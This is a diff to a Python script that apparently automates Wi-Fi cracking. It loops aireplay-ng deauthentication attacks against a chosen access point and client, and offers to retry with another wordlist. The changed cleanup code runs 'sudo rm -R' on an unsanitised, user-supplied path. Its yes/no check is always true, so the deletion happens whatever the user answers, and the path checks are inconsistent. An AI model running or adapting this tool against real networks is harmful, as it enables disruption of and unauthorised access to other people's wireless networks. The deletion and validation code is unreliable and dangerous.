@@ -24,18 +24,18 @@ while PATH_Validity != True:
 	PATH_Validity = os.path.exists(f"{PATH_2}")
 	PATH = PATH_2
 
-if os.path.exists(f"{PATH}AutomaticCRR"):
+if os.path.exists(f"AutomaticCRR"):
 	PATH = f"{PATH}AutomaticCRR/"
 	os.system(f"cd {PATH}")
-	print(f"All your data saved on the file {PATH} will be deleted.")
-	rm = input("Do you want ton continue [y/n] (MANDATORY FOR PROGRAM USE) : ")
-	if rm == "y" or "Y":
-		os.system(f"rm .{PATH}*")
+	if len(os.listdir(f"{PATH}")) != 0:
+		print(f"All your data saved on the file {PATH} will be deleted.")
+		rm = input("Do you want ton continue [y/n] (MANDATORY FOR PROGRAM USE) : ")
+		if rm == "y" or "Y":
+			os.system(f"sudo rm -R {PATH}")
 	else:
 		exit()
 
-if not os.path.exists("AutomaticCRR"):
-	os.makedirs(f"AutomaticCRR")
+os.makedirs(f"AutomaticCRR")
 
 PATH = (f"{PATH}AutomaticCRR/")
 
@@ -63,9 +63,9 @@ time.sleep(12)
 STATION = input("Enter the STATION of the network to crack : ")
 os.system("clear")
 
-while aireplay != 100:
+while aireplay != 50:
 	aireplay = aireplay + 1
-	os.system(f"gnome-terminal -- aireplay-ng -0 1 -a {BSSID} -c {STATION} {INTERFACE_2}")
+	os.system(f"aireplay-ng -0 1 -a {BSSID} -c {STATION} {INTERFACE_2}")
 
 time.sleep(1)
 os.system("clear")
@@ -89,3 +89,4 @@ if retry == "y" or "Y":
 	retry = input("Do you want to try again with another list ? [Y/N] : ")
 else:
 	exit()
+
